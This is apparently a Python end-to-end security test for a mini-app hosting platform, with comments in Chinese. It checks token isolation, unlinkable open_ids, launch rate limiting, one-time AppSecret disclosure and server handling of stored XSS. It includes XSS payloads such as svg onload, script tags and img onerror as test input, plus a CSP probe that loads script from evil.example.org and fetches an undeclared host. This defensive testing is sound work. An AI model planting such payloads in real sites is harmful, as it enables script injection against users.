"""小程序安全审计的服务端 e2e(DEV-PROMPTS-39 #335,逐项记录见 docs/miniapp-security-audit.md)。

- 1 token 隔离:启动应答、托管页 HTML / 返回头 / 脚本、SDK、云存储应答、授权后重签的 initData、
  模拟器启动里,没有登录 token、没有 JWT 形状的串、没有 Bearer。探测器先拿真 token 自检 ——
  探测器是瞎的话,「没扫到」什么也说明不了;
- 8 open_id 不可关联:两个应用不同;删掉映射行再启动,拿到的是一个**新的** open_id
  (说明是随机生成、表映射的,不是从用户 id 算的 —— 算出来的话删了重算还是同一个);
- 9 重放(平台侧):同一用户每分钟启动 30 次以内放行、第 31 次 429;
- 10 密钥:AppSecret 只出现在创建、轮换那一次的应答里;开发者、管理、公开接口和错误信息里都没有;
  库里存的是密文;
- 6 存储型 XSS(服务端这半):名称、描述、隐私政策、更新说明里写脚本,接口原样当文字返回 ——
  服务端不拼 HTML;前端没有 HTML 写入口由单测 test_miniapp_security_guards 守,
  真浏览器里渲染一遍由 scripts/verify_miniapp_browser.mjs 做(数据在这里备好,见文件末尾)。

其余几项(包校验、IDOR、CSP 返回头、隔离即时生效、云存储隔离与配额、Host 头、点击劫持、日志卫生)
由 e2e_miniapp_hosting / dev / storage 和单测覆盖,见审计记录。

跑法:SUPERZ_API=http://127.0.0.1:8013 python -m tests.e2e_miniapp_security
想顺带给浏览器检查备数据:再加 MINIAPP_BROWSER_FIXTURE=/path/to/fixture.json
"""
import json
import os
import re
import time
import urllib.parse
import uuid

from tests.miniapp_util import (CHECKLIST_ALL, HELLO, admin_token, customer, developer, make_zip,
                                new_app, publish, raw_get, sql, upload)
from tests.util import BASE, call

JWT = re.compile(r"eyJ[\w-]{6,}\.[\w-]{6,}\.[\w-]{6,}")


def leaks(blob: str, token: str) -> list[str]:
    found = []
    if token and token in blob:
        found.append("登录 token 原文")
    if JWT.search(blob):
        found.append("JWT 形状的串")
    if "Bearer " in blob:
        found.append("Bearer")
    return found


def dump(x) -> str:
    return x if isinstance(x, str) else json.dumps(x, ensure_ascii=False)


dev, _ = developer()
created = new_app(dev)
appid = created["app"]["appid"]
secret = created["app_secret"]
assert len(secret) == 43, "AppSecret 是 32 字节的 base64url"
v1 = publish(dev, appid)
user, _ = customer()

# ---- 探测器自检 ----
assert leaks(f"k={user}", user) == ["登录 token 原文", "JWT 形状的串"], \
    "探测器认不出登录 token —— 下面的「没扫到」就不可信"
assert leaks(json.dumps({"h": f"Bearer {user}"}), "") == ["JWT 形状的串", "Bearer"]
print("✓ 探测器自检:认得出登录 token 原文、JWT 形状、Bearer")

# ---- 1. token 隔离 ----
seen: dict[str, str] = {}
launch = call("POST", f"/mini-apps/{appid}/launch", user, {"platform": "web", "start_param": "p1"})
seen["启动应答"] = dump(launch)
path = urllib.parse.urlsplit(launch["url"]).path
for name, p in (("托管页 HTML", path), ("托管页脚本", path.replace("index.html", "app.js")),
                ("SDK", "/_mini-host/_sdk/2/sz-webapp.js")):
    s, h, body = raw_get(p)
    assert s == 200, (name, s)
    seen[name] = body.decode("utf-8", "replace") + dump(h)
for op, body in (("set", {"key": "k", "value": "v"}), ("get", {"keys": ["k"]}), ("keys", {}),
                 ("usage", {}), ("remove", {"keys": ["k"]})):
    seen[f"云存储 {op}"] = dump(call("POST", f"/mini-apps/{appid}/storage/{op}", user, body))
seen["状态轮询"] = dump(call("GET", f"/mini-apps/{appid}/status", user))
seen["详情"] = dump(call("GET", f"/mini-apps/{appid}", user))
cap = call("POST", f"/dev/v1/apps/{appid}/capabilities", dev,
           {"capability": "profile", "justification": "在记录旁边显示用户的昵称"})
call("POST", f"/admin/mini-apps/capabilities/{cap['id']}/decide", admin_token(),
     {"approve": True, "note": "安全审计用"})
seen["授权后重签的 initData"] = dump(call("POST", f"/mini-apps/{appid}/profile", user))
seen["模拟器启动"] = dump(call("POST", f"/dev/v1/apps/{appid}/sim/launch?version_id={v1['id']}", dev,
                              {"platform": "web"}))
for name, blob in seen.items():
    assert not leaks(blob, user) and dev not in blob, f"{name} 里有登录凭据:{leaks(blob, user)}"
print(f"✓ token 隔离:{len(seen)} 处页面看得到的内容里没有登录 token、JWT、Bearer")

# ---- 8. open_id 不可关联 ----
other = new_app(dev)["app"]["appid"]
publish(dev, other)


def open_id(app: str) -> str:
    init = call("POST", f"/mini-apps/{app}/launch", user, {"platform": "web"})["init_data"]
    return json.loads(dict(urllib.parse.parse_qsl(init))["user"])["open_id"]


first = open_id(appid)
assert first == open_id(appid), "同一个应用里要稳定"
assert open_id(other) != first, "不同应用必须不同"
uid = call("GET", "/auth/me", user)["id"]
assert str(uid) not in first[2:], "open_id 里不许带用户 id"
sql("DELETE FROM mini_app_openids WHERE user_id = :u AND app_id = "
    "(SELECT id FROM mini_apps WHERE appid = :a)", {"u": uid, "a": appid})
again = open_id(appid)
assert again != first, "删掉映射后还是同一个 —— open_id 是从用户 id 算出来的,可以被关联"
assert re.fullmatch(r"o_[a-z2-7]{26}", again), again
print("✓ open_id:按应用不同;删掉映射行再启动得到新的一个(随机生成、表映射,不从用户 id 算)")

# ---- 9. 重放:平台侧的启动限流 ----
# 限流按自然分钟算窗口:连发可能正好跨过整分,所以只数「撞上 429 的那一分钟里」放行了几次
burst, _ = customer()
seen = []
for _ in range(70):
    window = int(time.time() // 60)
    r = call("POST", f"/mini-apps/{appid}/launch", burst, {"platform": "web"},
             expect_error=True, retry_429=False)
    seen.append((window, r.get("_error", 200) if isinstance(r, dict) else 200))
    if seen[-1][1] == 429:
        break
assert seen[-1][1] == 429, f"连发 {len(seen)} 次都没被限流"
passed = sum(1 for w, c in seen if w == seen[-1][0] and c == 200)
assert 29 <= passed <= 30, f"撞上 429 的那一分钟里放行了 {passed} 次(应该是 30):{seen}"
print("✓ 重放:平台侧同一用户每分钟启动 30 次放行、第 31 次 429(initData 本身用 launch_id 防重放,见服务端文档)")

# ---- 10. 密钥只露一次 ----
rot = call("POST", f"/dev/v1/apps/{appid}/secret/rotate", dev)
pending = rot["app_secret_pending"]
assert pending != secret and len(pending) == 43
sweep = {
    "开发者 · 应用": call("GET", f"/dev/v1/apps/{appid}", dev),
    "开发者 · 应用列表": call("GET", "/dev/v1/apps", dev),
    "开发者 · 版本": call("GET", f"/dev/v1/apps/{appid}/versions", dev),
    "开发者 · 版本详情": call("GET", f"/dev/v1/apps/{appid}/versions/{v1['id']}", dev),
    "开发者 · 审核记录": call("GET", f"/dev/v1/apps/{appid}/decisions", dev),
    "开发者 · 数据": call("GET", f"/dev/v1/apps/{appid}/stats", dev),
    "开发者 · 模拟器": call("POST", f"/dev/v1/apps/{appid}/sim/launch?version_id={v1['id']}", dev,
                         {"platform": "web"}),
    "开发者 · 切换到新密钥": call("POST", f"/dev/v1/apps/{appid}/secret/activate", dev),
    "开发者 · 没有待切换时再切换(错误信息)": call("POST", f"/dev/v1/apps/{appid}/secret/activate", dev,
                                        expect_error=True),
    "管理 · 应用": call("GET", f"/admin/mini-apps/apps/{appid}", admin_token()),
    "管理 · 审核队列": call("GET", "/admin/mini-apps/reviews", admin_token()),
    "管理 · 审核详情": call("GET", f"/admin/mini-apps/reviews/{v1['id']}", admin_token()),
    "公开 · 详情": call("GET", f"/mini-apps/{appid}"),
    "公开 · 目录": call("GET", "/mini-apps/catalog", None),
    "用户 · 启动": call("POST", f"/mini-apps/{appid}/launch", user, {"platform": "web"}),
    "用户 · 我的数据": call("GET", f"/mini-apps/{appid}/data", user),
}
for name, r in sweep.items():
    blob = dump(r)
    assert secret not in blob and pending not in blob, f"{name} 里出现了 AppSecret"
enc = sql("SELECT secret_enc || '|' || coalesce(secret_pending_enc, '') FROM mini_apps "
          "WHERE appid = :a", {"a": appid}, fetch="scalar")
assert secret not in enc and pending not in enc and len(enc) > 60, "库里要存密文"
print(f"✓ 密钥:AppSecret 只在创建、轮换那一次的应答里;另外 {len(sweep)} 个接口和库里都没有明文")

# ---- 6. 存储型 XSS(服务端这半)----
# 名称全局不许重名、最长 20 字:标签本身 16 字,后面 4 位随机 —— 每次跑都是新的一条,不撞上次的残留
XSS_NAME = f"<svg onload=f()>{uuid.uuid4().hex[:4]}"
XSS_TEXT = "<script>window.__xss=1</script><img src=x onerror=\"window.__xss=2\">"
xss = call("POST", "/dev/v1/apps", dev, {"name": XSS_NAME, "kind": "app", "category": "tools",
                                         "tagline": "<b onclick=alert(1)>介绍</b>"})["app"]["appid"]
call("PUT", f"/dev/v1/apps/{xss}", dev,
     {"description": XSS_TEXT, "privacy_policy": XSS_TEXT + " 不收集任何个人信息,仅作测试用途。",
      "data_declaration": [{"field": "<i>昵称</i>", "purpose": XSS_TEXT[:60]}]})
xv = upload(dev, xss, make_zip(HELLO), changelog=XSS_TEXT)["version"]
call("POST", f"/dev/v1/apps/{xss}/versions/{xv['id']}/submit", dev, {"review_note": XSS_TEXT})
call("POST", f"/admin/mini-apps/reviews/{xv['id']}/decide", admin_token(),
     {"approve": True, "checklist": CHECKLIST_ALL})
call("POST", f"/dev/v1/apps/{xss}/versions/{xv['id']}/release", dev)
d = call("GET", f"/mini-apps/{xss}")
assert d["name"] == XSS_NAME and d["description"] == XSS_TEXT, "接口要原样返回文字,不替前端转义"
q = call("GET", f"/mini-apps/catalog?q={urllib.parse.quote(XSS_NAME)}")
assert q["items"][0]["appid"] == xss and q["items"][0]["name"] == XSS_NAME
print("✓ 存储型 XSS:脚本原样当文字存、原样返回;渲染交给前端(无 HTML 写入口,单测守 + 浏览器检查)")

# ---- 给浏览器检查备数据(scripts/verify_miniapp_browser.mjs)----
# CSP 探针:页面自己去碰每一条限制,把浏览器报的违规记在 window.__probe 里
PROBE = {
    "index.html": "<!doctype html><html><head><meta charset='utf-8'><title>CSP 探针</title>"
                  "<script src='/_sdk/2/sz-webapp.js'></script><script src='probe.js'></script>"
                  "</head><body><p>CSP 探针</p></body></html>",
    "probe.js": """
window.__probe = { violations: [], evalAllowed: null };
document.addEventListener('securitypolicyviolation', function (e) {
  window.__probe.violations.push(e.effectiveDirective + ' ' + e.blockedURI);
});
fetch('https://undeclared.example.org/collect?d=1').catch(function () {});
fetch('https://api.example.com/declared').catch(function () {});
var s = document.createElement('script'); s.src = 'https://evil.example.org/x.js'; document.head.appendChild(s);
var i = document.createElement('script'); i.textContent = 'window.__inline = 1'; document.head.appendChild(i);
try { window.__probe.evalAllowed = eval('true'); } catch (e) { window.__probe.evalAllowed = false; }
document.addEventListener('DOMContentLoaded', function () {
  var f = document.createElement('iframe'); f.src = 'https://example.org/'; document.body.appendChild(f);
});
""",
}

fixture = os.environ.get("MINIAPP_BROWSER_FIXTURE")
if fixture:
    from pathlib import Path

    # 审核后台的待审队列里要有一条带脚本的版本(更新说明、给审核员的话)
    xv2 = upload(dev, xss, make_zip(HELLO), version="1.0.1", changelog=XSS_TEXT)["version"]
    call("POST", f"/dev/v1/apps/{xss}/versions/{xv2['id']}/submit", dev, {"review_note": XSS_TEXT})
    # 个人开发者最多 5 个应用,上面已经用了 3 个:探针和模拟器用另一个开发者
    dev2, _ = developer()
    probe = new_app(dev2)["app"]["appid"]
    call("PUT", f"/dev/v1/apps/{probe}/domains", dev2, {"request_domains": ["https://api.example.com"]})
    pv = upload(dev2, probe, make_zip(PROBE))["version"]
    data = {"api": BASE, "xss_appid": xss, "xss_dev_token": dev, "dev_token": dev2,
            "admin_token": admin_token(), "probe_appid": probe,
            "probe_path": f"/_mini-host/{probe}/v/{pv['id']}/index.html"}
    # 模拟器里跑官方小程序:要先 bash scripts/build_miniapp.sh notepad / 2048 打好包
    root = Path(__file__).resolve().parents[2]
    for key, name, kind in (("notepad", "notepad", "app"), ("game", "2048", "game")):
        z = root / "miniapps" / name / "dist" / f"{name}.zip"
        if not z.exists():
            print(f"  没有 {z.relative_to(root)},模拟器那一段跳过(先跑 bash scripts/build_miniapp.sh {name})")
            continue
        a = new_app(dev2, kind=kind)["app"]["appid"]
        data[f"{key}_appid"] = a
        data[f"{key}_version"] = upload(dev2, a, z.read_bytes())["version"]["id"]
    with open(fixture, "w") as f:
        json.dump(data, f)
    print(f"  浏览器检查的数据写到了 {fixture}")
